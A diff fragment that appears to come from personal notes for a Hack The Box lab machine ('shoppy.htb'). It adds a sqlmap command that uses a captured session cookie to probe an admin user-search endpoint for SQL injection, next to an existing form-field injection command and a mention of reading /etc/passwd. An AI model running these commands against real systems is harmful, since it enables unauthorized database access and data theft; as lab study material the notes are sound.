@@ -27,6 +27,8 @@ Get /etc/passwd
 Post enumeration through form fields
 > sqlmap -u http://shoppy.htb/login --data="username=field1&password=field2" --level=5 --risk=3 --batch --ignore-code 401 
 
+If you need to login, use cookie session ID:
+> sqlmap -u http://shoppy.htb/admin/search-users?username=josh --level=5 --risk=3 --batch --cookie='s%3A6wlGpTIl3xb_IhGVax1wor2aZSOaPrJD.1RdQmA616qiNnLJTf95yXsoiTAAViei4h5vNt6LYZc0'
 
 
 Enumerate databases
